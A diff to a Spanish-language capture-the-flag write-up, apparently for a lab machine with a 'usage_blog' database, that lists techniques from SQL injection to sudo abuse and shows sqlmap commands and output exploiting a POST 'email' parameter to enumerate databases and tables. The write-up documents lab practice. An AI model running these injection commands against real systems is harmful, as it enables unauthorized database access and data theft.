@@ -7,6 +7,7 @@
 - Injección SQL.
 - Descifrado de hashes.
 - Abuso de subida de archivos.
+- Búsqueda de credenciales
 - Abuso de privilegios de sudo.
 <br>
 
@@ -93,7 +94,7 @@ Repetimos la operación, pero esta vez capturamos la petición mediante Burpsuit
 Almacenamos el contenido de la petición en un fichero llamado request.txt. Posteriormente le pasaremos el fichero de la petición a SQLMap para intentar explotar la vulnerabilidad de Injección de SQL. Añadimos la opción -p para indicar el campo que queremos que intente la injección.
 ```bash
 # sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch
-<omitido>
+<contenido omitido>
 sqlmap identified the following injection point(s) with a total of 740 HTTP(s) requests:
 ---
 Parameter: email (POST)
@@ -109,11 +110,23 @@ Parameter: email (POST)
 web server operating system: Linux Ubuntu
 web application technology: Nginx 1.18.0
 back-end DBMS: MySQL > 5.0.12
-<omitido>
+<contenido omitido>
 ```
-Ahora, enumeramos las bases de datos del servicio MYSQL. 
+Ahora, intentamos enumerar las bases de datos que el servicio MySQL pueda contener. 
 ```bash
 # sqlmap -r requests.txt  --level 5 --risk 3 -p email --dbs
+<contenido omitido>
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+<contenido omitido>
+```
+Hacemos lo mismo con las tablas de la base de dados "usage_blog".
+```bash
+sqlmap -r requests.txt  --level 5 --risk 3 -p email --batch -D usage_blog --tables
+<contenido omitido>
+<contenido omitido>
 ```
 
 
